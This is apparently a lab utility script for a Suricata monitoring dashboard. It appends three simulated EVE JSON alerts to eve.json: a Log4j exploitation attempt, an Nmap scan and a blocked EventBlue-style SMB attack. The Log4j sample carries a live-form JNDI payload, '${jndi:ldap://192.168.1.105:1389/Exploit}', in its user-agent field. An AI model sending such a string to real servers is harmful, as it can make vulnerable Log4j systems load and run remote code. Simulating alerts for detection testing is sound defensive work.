#!/usr/bin/env node

/**
 * Suricata SOC Monitor - CLI Lab Traffic Simulator
 * Appends authentic Suricata EVE JSON alerts directly to eve.json or via API
 */

import fs from 'fs';
import path from 'path';

const evePath = process.env.SURICATA_EVE_PATH || path.resolve('sample-data/eve.json');

const testScenarios = [
  {
    name: 'Log4j RCE Attempt (CVE-2021-44228)',
    event: {
      timestamp: new Date().toISOString(),
      flow_id: Math.floor(Math.random() * 1e10),
      in_iface: 'ens33',
      event_type: 'alert',
      src_ip: '192.168.1.105',
      src_port: 51240,
      dest_ip: '192.168.1.50',
      dest_port: 8080,
      proto: 'TCP',
      alert: {
        action: 'allowed',
        gid: 1,
        signature_id: 2014757,
        rev: 4,
        signature: 'ET EXPLOIT Apache Log4j JNDI RCE Attempt (CVE-2021-44228)',
        category: 'Attempted Administrator Privilege Gain',
        severity: 1,
      },
      http: {
        hostname: '192.168.1.50:8080',
        url: '/login',
        http_user_agent: '${jndi:ldap://192.168.1.105:1389/Exploit}',
        http_method: 'POST',
        protocol: 'HTTP/1.1',
        status: 400,
      },
      app_proto: 'http',
    },
  },
  {
    name: 'Nmap SYN Port Scan',
    event: {
      timestamp: new Date().toISOString(),
      flow_id: Math.floor(Math.random() * 1e10),
      in_iface: 'ens33',
      event_type: 'alert',
      src_ip: '192.168.1.105',
      src_port: 48920,
      dest_ip: '192.168.1.50',
      dest_port: 80,
      proto: 'TCP',
      alert: {
        action: 'allowed',
        gid: 1,
        signature_id: 2010935,
        rev: 5,
        signature: 'ET SCAN Nmap Scripting Engine User-Agent Detected',
        category: 'Attempted Information Leak',
        severity: 3,
      },
      http: {
        hostname: '192.168.1.50',
        url: '/',
        http_user_agent: 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
        http_method: 'GET',
        protocol: 'HTTP/1.1',
        status: 200,
      },
      app_proto: 'http',
    },
  },
  {
    name: 'IPS Inline Drop: EternalBlue SMB RCE',
    event: {
      timestamp: new Date().toISOString(),
      flow_id: Math.floor(Math.random() * 1e10),
      in_iface: 'ens33',
      event_type: 'alert',
      src_ip: '192.168.1.105',
      src_port: 60124,
      dest_ip: '192.168.1.50',
      dest_port: 445,
      proto: 'TCP',
      alert: {
        action: 'blocked',
        gid: 1,
        signature_id: 2024217,
        rev: 2,
        signature: 'ET EXPLOIT MS17-010 EternalBlue SMB Remote Code Execution [DROPPED INLINE]',
        category: 'Attempted Administrator Privilege Gain',
        severity: 1,
      },
      verdict: 'drop',
      app_proto: 'smb',
    },
  },
];

console.log(`[Simulator] Appending test events to ${evePath}...`);

try {
  for (const sc of testScenarios) {
    const line = JSON.stringify(sc.event) + '\n';
    fs.appendFileSync(evePath, line, 'utf-8');
    console.log(`  ✓ Appended: ${sc.name}`);
  }
  console.log('[Simulator] Done. Events should appear live on the dashboard.');
} catch (err) {
  console.error('[Simulator] Failed to append to eve.json:', err.message);
  process.exit(1);
}
